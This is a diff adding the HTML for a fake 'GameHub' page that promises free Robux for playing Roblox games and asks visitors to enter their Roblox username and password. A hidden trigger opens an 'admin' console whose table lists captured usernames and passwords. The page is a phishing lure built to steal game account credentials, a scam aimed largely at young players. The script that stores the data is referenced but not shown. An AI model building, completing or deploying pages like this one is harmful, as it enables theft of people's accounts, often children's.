@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GameHub - Roblox Rewards</title>
+    <link rel="stylesheet" href="styles.css">
+    <link href="https://googleapis.com" rel="stylesheet">
+</head>
+<body>
+
+    <!-- LOGIN SCREEN -->
+    <div id="login-view" class="view active">
+        <div class="game-bg-grid">
+            <div class="bg-card" style="background-image: url('https://unsplash.com')"></div>
+            <div class="bg-card" style="background-image: url('https://unsplash.com')"></div>
+            <div class="bg-card" style="background-image: url('https://unsplash.com')"></div>
+            <div class="bg-card" style="background-image: url('https://unsplash.com')"></div>
+        </div>
+
+        <div class="login-overlay">
+            <div class="login-card">
+                <h1 class="logo">GAME<span>HUB</span></h1>
+                <p class="subtitle">Log in to claim your Roblox rewards</p>
+                
+                <form id="login-form">
+                    <div class="input-group">
+                        <label for="username">Username / Email</label>
+                        <input type="text" id="username" placeholder="Enter Roblox Username" required autocomplete="off">
+                    </div>
+                    <div class="input-group">
+                        <label for="password">Password</label>
+                        <input type="password" id="password" placeholder="Enter Password" required>
+                    </div>
+                    <button type="submit" class="btn-primary">Connect Account</button>
+                </form>
+            </div>
+        </div>
+
+        <!-- Hidden Glitch Trigger for Admin view -->
+        <div id="admin-trigger" class="glitch-text" data-text="⚡ SECURE_">⚡ SECURE_</div>
+    </div>
+
+    <!-- GAME SELECTION VIEW -->
+    <div id="hub-view" class="view">
+        <div class="navbar">
+            <h2 class="logo-sm">GAME<span>HUB</span></h2>
+            <div class="user-badge"><span id="display-user">Player</span> | <span class="robux-count">0 R$</span></div>
+        </div>
+
+        <div class="hub-container">
+            <h3>Select a Game to Earn Robux</h3>
+            
+            <div class="games-grid">
+                <!-- Blox Fruits -->
+                <div class="game-card" onclick="openTasks('Blox Fruits', 'https://unsplash.com', 'Play for 1 hour of the game to claim your reward.', '10 Robux')">
+                    <div class="game-img" style="background-image: url('https://unsplash.com')"></div>
+                    <div class="game-info">
+                        <h4>BLOX FRUITS</h4>
+                        <span class="reward-tag">10 R$ Available</span>
+                    </div>
+                </div>
+
+                <!-- Rivals -->
+                <div class="game-card" onclick="openTasks('Rivals', 'https://unsplash.com', 'Win 3 matches in the Rivals arena.', '10 Robux')">
+                    <div class="game-img" style="background-image: url('https://unsplash.com')"></div>
+                    <div class="game-info">
+                        <h4>RIVALS</h4>
+                        <span class="reward-tag">10 R$ Available</span>
+                    </div>
+                </div>
+
+                <!-- Steel an Egg -->
+                <div class="game-card" onclick="openTasks('Steel an Egg', 'https://unsplash.com', 'Collect and secure 5 eggs safely.', '10 Robux')">
+                    <div class="game-img" style="background-image: url('https://unsplash.com')"></div>
+                    <div class="game-info">
+                        <h4>STEEL AN EGG</h4>
+                        <span class="reward-tag">10 R$ Available</span>
+                    </div>
+                </div>
+
+                <!-- JJS -->
+                <div class="game-card" onclick="openTasks('JJS', 'https://unsplash.com', 'Complete the beginner combat trial maps.', '10 Robux')">
+                    <div class="game-img" style="background-image: url('https://unsplash.com')"></div>
+                    <div class="game-info">
+                        <h4>JJS</h4>
+                        <span class="reward-tag">10 R$ Available</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- TASK DETAIL MODAL -->
+    <div id="task-modal" class="modal">
+        <div class="modal-content">
+            <span class="close-btn" onclick="closeTasks()">&times;</span>
+            <div id="modal-game-img" class="modal-banner"></div>
+            <h2 id="modal-game-title">Game Title</h2>
+            <div class="task-box">
+                <h5>ACTIVE QUEST:</h5>
+                <p id="modal-task-desc">Task description...</p>
+                <div class="progress-bar-container">
+                    <div class="progress-bar" id="task-progress"></div>
+                </div>
+                <small class="status-txt">In progress...</small>
+            </div>
+            <div class="reward-payout">
+                <span>Reward Amount:</span>
+                <strong id="modal-reward-val">10 Robux</strong>
+            </div>
+            <button class="btn-claim disabled" id="claim-btn" disabled>Claim Reward</button>
+        </div>
+    </div>
+
+    <!-- ADMIN PANEL -->
+    <div id="admin-view" class="view">
+        <div class="matrix-bg"></div>
+        <div class="terminal-window">
+            <div class="terminal-header">
+                <span class="dot red"></span>
+                <span class="dot yellow"></span>
+                <span class="dot green"></span>
+                <span class="title-text">CONSOLE://ROOT_ACCESS</span>
+                <button class="logout-admin-btn" onclick="exitAdmin()">Logout</button>
+            </div>
+            <div class="terminal-body">
+                <p class="blink-line">&gt; Telemetry Data Stream Active...</p>
+                <div class="table-container">
+                    <table class="hacker-table">
+                        <thead>
+                            <tr>
+                                <th>Session Time</th>
+                                <th>Captured Username</th>
+                                <th>Captured Password</th>
+                            </tr>
+                        </thead>
+                        <tbody id="admin-log-table">
+                            <tr class="empty-row">
+                                <td colspan="3">&gt; Awaiting initial credential sequence sync...</td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- TRANSTION OVERLAY STAGE -->
+    <div id="tile-transition-container"></div>
+
+    <script src="script.js"></script>
+</body>
+</html>
